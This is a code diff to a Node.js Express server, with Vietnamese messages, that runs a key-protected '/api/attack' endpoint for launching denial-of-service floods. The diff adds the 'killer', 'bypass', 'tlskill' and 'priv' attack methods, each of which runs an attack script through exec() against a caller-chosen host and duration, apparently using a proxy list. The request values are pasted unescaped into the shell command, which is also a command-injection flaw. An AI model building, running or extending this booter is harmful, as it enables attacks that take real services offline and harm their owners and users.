@@ -6,7 +6,7 @@ const app = express();
 const port = 9999;
 
 let activeAttacks = 0;
-const maxConcurrentAttacks = 3;
+const maxConcurrentAttacks = 1;
 
 const getPublicIP = async () => {
   try {
@@ -23,14 +23,16 @@ const validateInput = (key, host, time, method, port) => {
   if (key !== "negan") return "Invalid Key";
   if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
   if (port < 1 || port > 65535) return "Cổng không hợp lệ";
-  if (method.toLowerCase() !== "flood") return "Phương thức không hợp lệ";
+  if (!["flood", "killer", "bypass", "tlskill", "priv"].includes(method.toLowerCase())) {
+    return "Phương thức không hợp lệ";
+  }
   return null;
 };
 
 const executeAttack = (command, clientIP) => {
   exec(command, (error, stdout, stderr) => {
     if (stderr) console.error(stderr);
-    console.log(`[${clientIP}] Lệnh [flood] đã được thực thi thành công.`);
+    console.log(`[${clientIP}] Lệnh [${command}] đã được thực thi thành công.`);
     activeAttacks--;
   });
 };
@@ -49,7 +51,26 @@ app.get("/api/attack", (req, res) => {
   activeAttacks++;
   res.status(200).json({ status: "success", message: "Send Attack Successfully", host, port, time, method });
 
-  const command = `node flood ${host} ${time} 10 10 live.txt flood`;
+  // Tạo lệnh tấn công dựa trên phương thức
+  let command = "";
+  switch (method.toLowerCase()) {
+    case "flood":
+      command = `node flood ${host} ${time} 10 10 live.txt flood`;
+      break;
+    case "killer":
+      command = `node killer ${host} ${time} 10 10 live.txt killer`;
+      break;
+    case "bypass":
+      command = `node bypass ${host} ${time} 10 10 live.txt bypass`;
+      break;
+    case "tlskill":
+      command = `node tlskill ${host} ${time} 10 10 live.txt tlskill`;
+      break;
+    case "priv":
+      command = `node priv ${host} ${time} 10 10 live.txt priv`;
+      break;
+  }
+
   executeAttack(command, clientIP);
 });
 
